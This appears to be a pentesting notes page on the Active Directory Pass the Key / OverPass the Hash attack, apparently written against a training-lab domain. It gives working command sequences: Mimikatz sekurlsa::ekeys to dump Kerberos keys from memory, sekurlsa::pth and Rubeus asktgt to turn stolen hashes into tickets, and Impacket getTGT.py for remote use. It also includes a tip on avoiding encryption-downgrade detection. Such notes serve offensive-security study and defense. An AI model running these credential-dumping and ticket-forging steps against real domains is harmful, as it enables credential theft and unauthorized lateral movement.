# Pass the Key or OverPass the Hash 
- https://lisandre.com/archives/14788
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key
- https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/
- https://www.thehacker.recipes/ad/movement/kerberos/ptk

The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation Abusing Microsoft Kerberos - Sorry you guys don't get it. Also Will Schroeder adapted their project to create the Rubeus tool.

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.

## Mimikatz - Extract Kerberos Keys
```
> mimikatz.exe
> privilege::debug
> sekurlsa::ekeys
```

Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.

### Mimikatz - Pass the Key or OverPass the Hash
```
> mimikatz.exe
> privilege::debug
> sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.

To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.

## Rubeus - Pass the Key or OverPass the Hash
```
> Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /nowrap
```

`Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.`


`Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."`

## Remotely
I wish to execute this attack remotely then use impacket python script gettgt.py which will use a password, hash or aesKey, it will request a TGT and save it as ccache.

```
# with an NT hash (overpass-the-hash)
$ getTGT.py -dc-ip <IP> -hashes :<NTLM hash> <DOMAIN>/<USER>

# with an AES (128 or 256 bits) key (pass-the-key)
$ getTGT.py -dc-ip <IP> -aesKey'<aes Key>' <DOMAIN>/<USERNAME>@<IP>
```